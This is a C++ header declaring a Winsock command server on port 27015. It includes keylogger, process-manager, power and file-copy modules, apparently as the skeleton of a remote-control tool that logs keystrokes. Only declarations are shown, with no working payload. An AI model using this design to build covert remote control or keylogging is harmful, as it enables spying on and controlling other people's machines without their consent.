#pragma once
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include "keylogger.h"
#include "PowerRelatedFunction.h"
#include "process_manager.h"
#include "copyfile.h"
#pragma comment(lib, "ws2_32.lib")

class Server
{
public:
    std::string port;
    WSADATA wsaData;
    SOCKET listenSock = INVALID_SOCKET;
    SOCKET clientSock = INVALID_SOCKET;
    char command[BUFSIZ];
    struct addrinfo hints{}, *res = nullptr;

    const char *PORT = "27015";
    const int BUFSIZE = 512;

    Server(std::string _port)
    {
        if (_port.empty())
        {
            port = PORT;
        }
    }

    void Init();
    void GetCommandFromClient();
    void ProcessCommand();
    void Shutdown();
};